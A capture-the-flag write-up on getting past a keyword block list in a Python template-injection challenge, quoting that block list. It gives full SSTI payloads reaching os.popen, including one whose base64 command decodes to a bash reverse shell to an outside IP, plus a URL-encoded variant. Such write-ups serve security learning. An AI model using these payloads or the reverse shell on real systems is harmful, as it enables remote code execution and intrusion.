# CTF Write-up — "5571"

## Challenge Description

We have an application where we can exec python code, but a number of potentially dangerous literals is blocked :

BLOCKED_LITERALS = [
  '{', '}', '__', 'open', 'os', 'subprocess', 'import', 'eval', 'exec',
  'system', 'popen', 'builtins', 'globals', 'locals', 'getattr', 'setattr',
  'class', 'compile', 'inspect'
]

---

## Bypass approach

First, we URL-encode a few required characters:

_ → %5F or \x5f
{ → %7B
} → %7D

Next, because the filter blocks identifiers such as globals and builtins, we rely on a string/concatenation bypass inside dictionary access to reconstruct blocked names at runtime. 

The payload we used (constructed to evade the filter by encoding __ and using string concatenation where necessary) is :

{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}

## Notes on the payload

The payload uses request["application"]["__globals__"]["__builtins__"]["__import__"]("os") to obtain the os module despite globals/builtins/import being blacklisted — the identifiers are encoded/concatenated to bypass the blacklist.

We execute a base64-encoded command to avoid problematic characters in the payload. For example, to run cat flag.txt the base64 encoding is Y2F0IGZsYWcudHh0Cg==. Encoding commands lets us carry out the desired action while minimising direct use of blocked strings.

Example of a concatenation bypass: ["\x5f\x5fglobals\x5f\x5f"] can be transformed into ["\x5f\x5fglob" + "als\x5f\x5f"] so that the literal globals never appears uninterrupted in the source, but the interpreter still resolves the key.

## Summary

We combined URL encoding, string encoding (\x5f for _) and dictionary string concatenation to reconstruct blocked identifiers at runtime.

Commands were base64-encoded and decoded on the target to avoid forbidden characters (if there are).

This method allowed execution of arbitrary commands despite the blacklist.

## Final payload 

```
{% with a = request["application"]["\x5f\x5fglob"+"als\x5f\x5f"]["\x5f\x5fbuil"+"tins\x5f\x5f"]["\x5f\x5fimp"+"ort\x5f\x5f"]("o"+"s")["pop"+"en"]("echo -n Y2F0IGZsYWcudHh0Cg== | base64 -d | bash")["read"]() %} {{ a }} {% endwith %}

URL Encoded :
%7B%25%20with%20a%20%3D%20request%5B%22application%22%5D%5B%22%5Cx5f%5Cx5fglob%22%2B%22als%5Cx5f%5Cx5f%22%5D%5B%22%5Cx5f%5Cx5fbuil%22%2B%22tins%5Cx5f%5Cx5f%22%5D%5B%22%5Cx5f%5Cx5fimp%22%2B%22ort%5Cx5f%5Cx5f%22%5D%28%22o%22%2B%22s%22%29%5B%22pop%22%2B%22en%22%5D%28%22echo%20-n%20Y2F0IGZsYWcudHh0Cg%3D%3D%20%7C%20base64%20-d%20%7C%20bash%22%29%5B%22read%22%5D%28%29%20%25%7D%20%7B%7B%20a%20%7D%7D%20%7B%25%20endwith%20%25%7D
```
## Flag

```
v1t{n0th1ng_b34ts_url_ssti_9cfac8e6b8978e3f6037d9608fed7767}
```
